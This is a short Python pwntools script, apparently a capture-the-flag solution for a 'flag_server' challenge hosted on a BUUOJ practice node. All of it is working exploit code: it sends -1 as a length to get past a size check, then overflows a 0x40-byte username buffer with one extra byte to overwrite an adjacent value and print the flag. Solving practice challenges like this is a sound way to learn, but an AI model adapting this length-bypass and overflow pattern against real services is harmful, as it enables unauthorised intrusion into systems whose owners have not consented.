from pwn import *

#context.log_level = 'debug'

#p = process('./flag_server')
p = remote('node4.buuoj.cn', 26378)

p.sendlineafter(b'length: ', b'-1')

payload = b'a' * 0x40 + b'\x01'

p.sendlineafter(b'username?\n', payload)

p.recvuntil(b'you:')

print(p.recv().decode())